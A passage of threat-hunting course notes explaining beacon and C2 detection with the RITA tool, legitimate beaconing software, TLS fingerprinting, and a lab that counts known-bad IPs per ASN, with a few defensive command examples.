Jitter — a smart attacker deliberately varies the interval (e.g. 7s ±2s → random 5–9s). It isn't perfectly regular, but it still has beacon characteristics (a symmetric cluster around 7s). The interval doesn't have to be perfect — it just has to have beacon characteristics.

Long connections — instead of beaconing, an attacker can hold one connection open for a long time. John's spaghetti analogy: break one long strand (a long connection) into pieces (chopped-up connections), but add the pieces back up and you get the original day's worth. Chopping it up to hide still shows up when you sum it.

Full beacon / C2 detection notes: Network → Beaconing & C2.

docs.title: 7. RITA — the beacon-detection engine
docs.text:
The math lives in RITA (Real Intelligence Threat Analytics) — a free BHIS tool, kept open-source via patents. It does two things: find beacons and check deny lists (compare against known-bad IPs — more in part 3).

The math

  • K-means clustering — finds patterns (consistency) in data. Like a CAPTCHA teaching pattern recognition by repeatedly asking you to pick traffic lights / bicycles, it finds clusters of consistent interval and size.
  • MADM (median absolute deviation of the mean) — similarly measures the consistency of the distribution.

Beacon score — each connection gets a 0–1 score; closer to 1 = a more perfect beacon. You also look at connection count (e.g. 108,000 connections at perfect intervals).

A beacon isn't always malware (legit beacons)

Regular beaconing isn't only malware — TeamViewer (staff may use it to bypass filters), RDP, Nuance / Dragon (had built-in remote control), LAN Turtle (a USB-to-Ethernet-shaped mini Linux). Not all malicious, but all worth investigating.

Other things to look at — User-Agent strings (how an internal system identifies itself), MIME types (what kind of data is moving — returns in part 3 as "MIME mismatch"), JA3/JA4 (fingerprinting the TLS client hello; JA3 broke when browsers randomised the hello, so JA4 now).

Long-tail analysis — sort normal vs abnormal and the anomalies cluster in the rare long tail. Human traffic is messy and irregular; a beacon is unusually consistent, so it stands out in that tail.

docs.title: Is there a hands-on RITA lab?
docs.text:
Day 2 has no standalone command-line RITA lab. RITA is taught as the engine; the hands-on beacon analysis is done through AC-Hunter's GUI, which runs on it (part 3). So RITA = the free command-line engine, AC-Hunter = the paid GUI on top (a community edition exists). The beacon math in the first ASA-log lab used R tools, not RITA.

💡 Note (added) — running RITA yourself

RITA is free, so you can run it against your home-lab Zeek logs (conceptual flow):

# import Zeek logs into a RITA database
rita import /opt/zeek/logs/2026-10-17 mydataset
# show beacon analysis, highest score first
rita show-beacons mydataset
rita show-exploded-dns mydataset

rita import <zeek-log-dir> <name> loads the logs; rita show-beacons <name> shows beacon scores (0–1) and connection counts. Recent RITA (v5+) is configured differently — check the docs. This is a supplement, separate from the actual course lab.

docs.title: 8. ASN — "the internet's postcode"
docs.text: John extends RITA's second job, deny-list checking, to the ASN level. An ASN (Autonomous System Number) identifies an organisation that manages a block of IP addresses (ISPs, cloud providers …) — in John's analogy, the internet's postcode. There are good neighbourhoods and bad ones.

docs.title: Lab — which neighbourhoods do bad IPs live in?
docs.text:
1. Download a continuously updated bad-IP list from GitHub.
  2. Feed each IP to Team Cymru (an IP → ASN lookup service) to get its ASN (takes a while — lots of data).
  3. Count bad IPs per ASN and sort.

💡 Note (added)

This kind of tally is usually done on Linux with sort | uniq -c | sort -rn — uniq -c counts identical values, sort -rn sorts largest first. Follow the lab handout for the exact command.

The output's first column is the bad-IP count, the second the ASN:

4925  Alibaba
4563  DigitalOcean
....  (several Chinese ASNs)
....  Microsoft
....  Amazon

Page down and the numbers drop off fast (a few pages in, you're at ~39). There are roughly 80–90k ASNs on the internet, yet most bad IPs sit in a tiny handful of them.

Key point
